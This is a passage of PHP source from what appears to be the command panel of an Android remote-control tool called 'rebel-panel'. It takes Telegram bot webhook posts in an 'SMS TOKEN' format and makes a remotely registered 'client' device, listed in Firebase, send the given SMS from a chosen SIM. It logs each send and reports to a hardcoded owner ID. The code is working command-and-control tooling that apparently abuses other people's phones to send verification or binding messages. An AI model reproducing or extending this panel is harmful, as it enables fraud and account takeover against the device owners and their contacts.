    }
    return ltrim($chatId, '-') === ltrim($want, '-');
}

function rebel_sms_token_public_log(array $config, int $limit = 15): array
{
    $log = $config['log'] ?? [];
    if (!is_array($log)) {
        return [];
    }
    $out = [];
    foreach (array_slice($log, 0, $limit) as $row) {
        if (!is_array($row)) {
            continue;
        }
        $out[] = [
            'ts' => (int)($row['ts'] ?? 0),
            'time' => !empty($row['ts']) ? date('d/m/Y h:i A', (int)$row['ts']) : '',
            'ok' => !empty($row['ok']),
            'to' => (string)($row['to'] ?? ''),
            'message' => (string)($row['message'] ?? ''),
            'error' => (string)($row['error'] ?? ''),
            'source' => (string)($row['source'] ?? ''),
        ];
    }
    return $out;
}

function rebel_sms_token_log_entry(array $entry): void
{
    $cfg = rebel_sms_token_load();
    if (!isset($cfg['log']) || !is_array($cfg['log'])) {
        $cfg['log'] = [];
    }
    array_unshift($cfg['log'], $entry);
    $cfg['log'] = array_slice($cfg['log'], 0, 40);
    rebel_sms_token_save($cfg);
}

/** Parse Telegram channel "SMS TOKEN" format: To + Message */
function rebel_parse_sms_token(string $text): ?array
{
    $text = trim($text);
    if ($text === '' || !preg_match('/SMS\s*TOKEN/i', $text)) {
        return null;
    }
    $to = '';
    if (preg_match('/(?:📞\s*)?To:\s*([+\d\s\-()]+)/iu', $text, $m)) {
        $to = preg_replace('/\D/', '', $m[1]);
    }
    $msg = '';
    if (preg_match('/(?:💬\s*)?Message:\s*(.+)/isu', $text, $m)) {
        $msg = trim($m[1]);
        $msg = preg_replace('/[━─_]{3,}.*$/su', '', $msg);
        $msg = trim($msg);
    }
    if (strlen($to) < 10 || $msg === '') {
        return null;
    }
    if (strlen($to) > 10) {
        $to = substr($to, -10);
    }
    return ['to' => $to, 'message' => $msg];
}

function rebel_bot_token(): string
{
    $cfg = rebel_sms_token_load();
    $token = trim((string)($cfg['bot_token'] ?? ''));
    if ($token !== '') {
        return $token;
    }
    $token = trim((string)getenv('REBEL_BOT_TOKEN'));
    if ($token !== '') {
        return $token;
    }
    $file = __DIR__ . '/rebel_bot_token.txt';
    if (is_file($file)) {
        return trim((string)file_get_contents($file));
    }
    return '';
}

function rebel_bot_owner_id(): string
{
    $cfg = rebel_sms_token_load();
    $owner = trim((string)($cfg['owner_id'] ?? ''));
    if ($owner !== '') {
        return $owner;
    }
    $owner = trim((string)getenv('REBEL_OWNER_ID'));
    if ($owner !== '') {
        return $owner;
    }
    return '8432393497';
}

function rebel_tg_api(string $method, array $params = []): array
{
    $botToken = rebel_bot_token();
    if ($botToken === '') {
        return ['ok' => false, 'error' => 'Bot token not configured'];
    }
    $url = 'https://api.telegram.org/bot' . $botToken . '/' . $method;
    $payload = json_encode($params ?: new stdClass());
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_TIMEOUT => 35,
            CURLOPT_CONNECTTIMEOUT => 15,
        ]);
        $raw = curl_exec($ch);
        curl_close($ch);
        $data = json_decode($raw ?: '{}', true);
        return is_array($data) ? $data : ['ok' => false];
    }
    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => $payload,
            'timeout' => 35,
        ],
    ]);
    $raw = @file_get_contents($url, false, $ctx);
    $data = json_decode($raw ?: '{}', true);
    return is_array($data) ? $data : ['ok' => false];
}

function rebel_tg_send(string $chatId, string $text): array
{
    if ($chatId === '') {
        return ['ok' => false];
    }
    return rebel_tg_api('sendMessage', [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ]);
}

function rebel_bot_webhook_url(): string
{
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $script = $_SERVER['SCRIPT_NAME'] ?? '/rebel-panel/sex.php';
    return $scheme . '://' . $host . $script . '?rebel_bot_webhook=1';
}

function rebel_sms_token_try_send(string $text, array $meta = []): bool
{
    $parsed = rebel_parse_sms_token($text);
    if (!$parsed) {
        return false;
    }
    $cfg = rebel_sms_token_load();
    $source = (string)($meta['source'] ?? '');
    if (empty($cfg['enabled'])) {
        rebel_sms_token_log_entry([
            'ts' => time(),
            'ok' => false,
            'to' => $parsed['to'],
            'message' => $parsed['message'],
            'error' => 'Auto token SMS disabled',
            'source' => $source,
        ]);
        return true;
    }
    $dedup = md5($parsed['to'] . '|' . $parsed['message']);
    foreach ($cfg['log'] as $row) {
        if (!empty($row['dedup']) && $row['dedup'] === $dedup && (time() - (int)($row['ts'] ?? 0)) < 120) {
            return true;
        }
    }
    if (empty($cfg['device_id']) || empty($cfg['database_url'])) {
        rebel_sms_token_log_entry([
            'ts' => time(),
            'ok' => false,
            'to' => $parsed['to'],
            'message' => $parsed['message'],
            'error' => 'Device or Firebase not configured',
            'source' => $source,
        ]);
        rebel_tg_send(rebel_bot_owner_id(), "❌ SMS TOKEN parsed but device not set.\nTo: <code>" . htmlspecialchars($parsed['to'], ENT_QUOTES, 'UTF-8') . "</code>\nPanel → Auto Token → Enable + select device");
        return true;
    }
    $res = rebel_send_sms_to_device(
        rtrim((string)$cfg['database_url'], '/'),
        (string)($cfg['auth_key'] ?? ''),
        (string)$cfg['device_id'],
        max(1, (int)($cfg['sim'] ?? 1)),
        $parsed['to'],
        $parsed['message'],
        (string)($cfg['schema'] ?? 'rabel'),
        (string)($cfg['device_node'] ?? 'clients')
    );
    rebel_sms_token_log_entry([
        'ts' => time(),
        'ok' => !empty($res['ok']),
        'to' => $parsed['to'],
        'message' => $parsed['message'],
        'device' => (string)$cfg['device_id'],
        'source' => $source,
        'dedup' => $dedup,
        'error' => (string)($res['error'] ?? ''),
    ]);
    if (!empty($res['ok'])) {
        $body = htmlspecialchars(mb_substr($parsed['message'], 0, 200), ENT_QUOTES, 'UTF-8');
        rebel_tg_send(rebel_bot_owner_id(), "✅ <b>Auto SMS Sent</b>\n\n📞 To: <code>" . htmlspecialchars($parsed['to'], ENT_QUOTES, 'UTF-8') . "</code>\n💬 " . $body);
    } else {
        rebel_tg_send(rebel_bot_owner_id(), "❌ Auto SMS failed\nTo: <code>" . htmlspecialchars($parsed['to'], ENT_QUOTES, 'UTF-8') . "</code>\n" . htmlspecialchars((string)($res['error'] ?? 'Unknown'), ENT_QUOTES, 'UTF-8'));
    }
    return true;
}

function rebel_bot_norm_cmd(string $text): string
{
    $text = trim($text);
    $text = preg_replace('/@\w+/i', '', $text);
    return trim($text);
}

function rebel_bot_handle_command(array $update): bool
{
    $msg = $update['message'] ?? null;
    if (!$msg) {
        return false;
    }
    $fromId = (string)($msg['from']['id'] ?? '');
    $chatId = (string)($msg['chat']['id'] ?? '');
    $text = rebel_bot_norm_cmd((string)($msg['text'] ?? ''));
    if ($text === '' || $fromId !== rebel_bot_owner_id()) {
        return false;
    }
    if (preg_match('/^\/smstoken\s+(on|off)\b/i', $text, $m)) {
        $cfg = rebel_sms_token_load();
        $cfg['enabled'] = strtolower($m[1]) === 'on';
        $cfg['updated'] = time();
        rebel_sms_token_save($cfg);
        $dev = $cfg['device_id'] ?: 'not set — use panel Set Device';
        rebel_tg_send($chatId, $cfg['enabled']
            ? "✅ Auto Token SMS <b>ON</b>\nAdd bot as admin to your Telegram channel.\nDevice: <code>" . htmlspecialchars($dev, ENT_QUOTES, 'UTF-8') . "</code>"
            : '⏸ Auto Token SMS <b>OFF</b>');
        return true;
    }
    if (preg_match('/^\/setdevice\s+(\S+)/i', $text, $m)) {
        $cfg = rebel_sms_token_load();
        $cfg['device_id'] = trim($m[1]);
        $cfg['updated'] = time();
        rebel_sms_token_save($cfg);
        rebel_tg_send($chatId, "✅ Auto SMS device set:\n<code>" . htmlspecialchars($cfg['device_id'], ENT_QUOTES, 'UTF-8') . '</code>');
        return true;
    }
    if (preg_match('/^\/smstoken\b/i', $text)) {
        $cfg = rebel_sms_token_load();
        $status = !empty($cfg['enabled']) ? 'ON' : 'OFF';
        rebel_tg_send($chatId, "⚡ Auto Token SMS: <b>{$status}</b>\nDevice: <code>" . htmlspecialchars((string)($cfg['device_id'] ?: 'not set'), ENT_QUOTES, 'UTF-8') . "</code>\n\nCommands:\n/smstoken on|off\n/setdevice DEVICE_ID");
        return true;
    }
    return false;
}

function rebel_bot_handle_update(array $update): bool
{
    if (!empty($update['channel_post']) || !empty($update['edited_channel_post'])) {
        $post = $update['channel_post'] ?? $update['edited_channel_post'];
        $chatId = (string)($post['chat']['id'] ?? '');
        if (!rebel_sms_token_channel_allowed($chatId)) {
            return true;
        }
        $text = trim((string)($post['text'] ?? $post['caption'] ?? ''));
        if ($text !== '') {
            rebel_sms_token_try_send($text, ['source' => 'channel', 'chat_id' => $chatId]);
        }
        return true;
    }
    $msg = $update['message'] ?? null;
    if (!$msg) {
        return false;
    }
    $text = trim((string)($msg['text'] ?? $msg['caption'] ?? ''));
    if ($text !== '' && rebel_parse_sms_token($text)) {
        rebel_sms_token_try_send($text, ['source' => 'message', 'chat_id' => (string)($msg['chat']['id'] ?? '')]);
    }
    if ($text !== '' && preg_match('/^\//', $text)) {
        return rebel_bot_handle_command($update);
    }
    return $text !== '';
}

function rebel_sms_token_api_handle(): void
{
    $body = json_decode(file_get_contents('php://input') ?: '{}', true);
    if (!is_array($body)) {
        $body = $_POST;
    }
    if (!is_array($body)) {
        $body = [];
    }

    $action = strtolower(trim((string)($body['action'] ?? 'get')));
    $config = rebel_sms_token_load();

    if ($action === 'get') {
        rebel_json_out([
            'ok' => true,
            'config' => rebel_sms_token_public_config($config),
            'log' => rebel_sms_token_public_log($config),
            'webhook' => rebel_bot_webhook_url(),
            'bot_configured' => rebel_bot_token() !== '',
        ]);
    }

    if ($action === 'save') {
        if (array_key_exists('enabled', $body)) {
            $config['enabled'] = !empty($body['enabled']);
        }
        if (array_key_exists('device_id', $body)) {
            $config['device_id'] = trim((string)$body['device_id']);
        }
        if (array_key_exists('database_url', $body)) {
            $config['database_url'] = trim((string)$body['database_url']);
        }
        if (array_key_exists('fb_name', $body)) {
            $config['fb_name'] = trim((string)$body['fb_name']);
        }
        if (array_key_exists('auth_key', $body)) {
            $config['auth_key'] = trim((string)$body['auth_key']);
        }
        if (array_key_exists('schema', $body)) {
            $config['schema'] = strtolower(trim((string)$body['schema'])) ?: 'rabel';
        }
        if (array_key_exists('device_node', $body)) {
            $config['device_node'] = trim((string)$body['device_node']) ?: 'clients';
        }
        if (array_key_exists('sim', $body)) {
            $config['sim'] = max(1, (int)$body['sim']);
        }
        if (array_key_exists('bot_token', $body)) {
            $config['bot_token'] = trim((string)$body['bot_token']);
        }
        if (array_key_exists('channel_id', $body)) {
            $config['channel_id'] = trim((string)$body['channel_id']);
        }
        if (array_key_exists('owner_id', $body)) {
            $config['owner_id'] = trim((string)$body['owner_id']);
        }
        $config['updated'] = time();
        rebel_sms_token_save($config);
        rebel_json_out([
            'ok' => true,
            'config' => rebel_sms_token_public_config($config),
            'log' => rebel_sms_token_public_log($config),
        ]);
    }

    if ($action === 'setup_webhook') {
        if (array_key_exists('bot_token', $body) && trim((string)$body['bot_token']) !== '') {
            $config['bot_token'] = trim((string)$body['bot_token']);
        }
        if (array_key_exists('channel_id', $body)) {
            $config['channel_id'] = trim((string)$body['channel_id']);
        }
        if (array_key_exists('owner_id', $body)) {
            $config['owner_id'] = trim((string)$body['owner_id']);
        }
        if (!empty($config['bot_token']) || !empty($config['channel_id']) || !empty($config['owner_id'])) {
            $config['updated'] = time();
            rebel_sms_token_save($config);
        }
        $hook = rebel_bot_webhook_url();
        if (strpos($hook, 'https://') !== 0) {
            rebel_json_out([
                'ok' => false,
                'error' => 'HTTPS domain required for Telegram webhook',
                'webhook' => $hook,
            ], 400);
        }
        if (rebel_bot_token() === '') {
            rebel_json_out(['ok' => false, 'error' => 'Bot token not set — save token in panel first'], 400);
        }
        $res = rebel_tg_api('setWebhook', ['url' => $hook, 'drop_pending_updates' => true]);
        rebel_json_out([
            'ok' => !empty($res['ok']),
            'webhook' => $hook,
            'telegram' => $res,
            'config' => rebel_sms_token_public_config(rebel_sms_token_load()),
        ], !empty($res['ok']) ? 200 : 502);
    }

    if ($action === 'test') {
        $sample = "SMS TOKEN\nTo: 9876543210\nMessage: Test auto token " . date('H:i:s');
        rebel_sms_token_try_send($sample, ['source' => 'panel_test']);
        $config = rebel_sms_token_load();
        rebel_json_out([
            'ok' => true,
            'config' => rebel_sms_token_public_config($config),
            'log' => rebel_sms_token_public_log($config),
        ]);
    }

    rebel_json_out(['ok' => false, 'error' => 'Unknown action'], 400);
}
